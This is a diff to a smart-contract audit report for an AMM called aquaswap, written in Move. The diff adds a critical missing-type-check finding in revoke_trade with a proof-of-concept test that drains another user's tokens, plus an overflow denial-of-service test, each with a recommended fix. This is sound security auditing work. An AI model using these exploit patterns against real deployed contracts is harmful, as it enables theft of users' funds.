@@ -85,14 +85,55 @@ assert!(trade.user_address == address_of(user), ERR_PERMISSION_DENIED);
 
 **Severity**: Critical  
 **Likelihood**: High  
-**Location**: `public fun cancel_order`
+**Location**: `public fun revoke_trade<BaseTokenType>`
 
 **Description**:  
-The `cancel_order` function does not assert that the generic type `BaseCoinType` matches the `base_type` stored in the `Order` resource. This enables a malicious actor to drain all liquidity by canceling orders with incorrect coin types.
+The `revoke_trade` function does not assert that the inputted `BaseTokenType` generic type matches the `base_type` `TypeInfo` stored on the `Trade` resource.
 
-**Correct Implementation**:  
+This function unlocks the liquidity for a given base token type and returns the stored amount of the token to the user:
+
+**Affected Code**:
 ```rust
-assert!(order.base_type == type_info::type_of<BaseCoinType>(), ERR_ORDER_WRONG_COIN_TYPE);
+public fun revoke_trade<BaseTokenType>(
+    user: &signer,
+    trade_id: u64
+) acquires TradeStore, TokenStore {
+    // [...]
+    transfer_tokens<BaseTokenType>(trade_store, address_of(user), trade.base_amount);
+    // [...]
+}
+```
+Impact:
+An attacker could potentially drain liquidity from the AMM by placing a limit trade order and canceling the order — passing the incorrect token type.
+
+Proof of Concept:
+
+```rust
+#[test(admin=@aquaswap, user=@0x3333)]
+fun WHEN_exploit_lack_of_type_checking(admin: &signer, user: &signer) acquires TokenCapability {
+    let (my_eth, trade_id) = setup_with_limit_trade(admin, user, 500000000000000);
+
+    // let's say the admin deposits some BLU
+    mint<BLU>(my_eth, address_of(admin));
+    let _admin_trade_id = market::limit_trade<BLU, ETH>(admin, my_eth, 500000000000000);
+
+    // now, let's try stealing from the admin
+    assert!(token::balance<ETH>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
+    assert!(token::balance<BLU>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
+
+    market::revoke_trade<BLU>(user, trade_id); // BLU is not the right token type!
+
+    assert!(token::balance<ETH>(address_of(user)) == 0, ERR_UNEXPECTED_BALANCE);
+    assert!(token::balance<BLU>(address_of(user)) == my_eth, ERR_UNEXPECTED_BALANCE); // received BLU?
+}
+```
+
+Recommendations:
+Add the following type-checking assertion to the revoke_trade function:
+
+```rust
+assert!(trade.base_type == type_info::type_of<BaseTokenType>(), ERR_TRADE_WRONG_TOKEN_TYPE);
+
 ```
 
 ## VUL-003: Unbounded Execution - DOS
@@ -152,15 +193,37 @@ coin::register<QuoteCoinType>(user);
 
 **Severity**: Medium  
 **Likelihood**: Medium  
-**Location**: `fun calculate_lp_coin_amount_internal`, `fun calculate_protocol_fees`
+**Location**: `fun calculate_lp_token_amount_internal`, `fun calculate_protocol_fees`
 
 **Description**:  
 Susceptibility to overflow errors can cause denial of service in various functions.
 
-**Correct Implementation**:  
-Cast operands to `u128` before multiplication and ensure the result fits within `u64` limits to prevent overflow errors.
+**Proof of Concept**:
+```rust
+#[test(admin=@aquaswap, user=@0x3333)]
+#[expected_failure(arithmetic_error, location=market)]
+fun WHEN_exploit_overflow_revert(admin: &signer, user: &signer) acquires TokenCapability {
+    setup_with_liquidity(admin, user);
 
+    // add extra AQUA liquidity
+    let admin_aqua = 1000000000000000;
+    mint<AQUA>(admin_aqua, address_of(admin));
+    market::admin_deposit_aqua(admin, admin_aqua);
+
+    // place a reasonable order size for OCEAN
+    let user_ocean = 1000000000000000;
+    mint<OCEAN>(user_ocean, address_of(user));
+    market::limit_swap<OCEAN, BLU>(user, user_ocean, 0);
+
+    // inadvertently fulfill limit order
+    let admin_blu = 10000;
+    mint<BLU>(admin_blu, address_of(admin));
+    market::add_liquidity<BLU>(admin, admin_blu);
+}
+```
 
 **Correct Implementation**:  
-Store resources within the user’s account.
+- Cast operands to `u128` before multiplication and ensure the result fits within `u64` limits to prevent overflow errors.
+
+- Store resources within the user’s account.
 
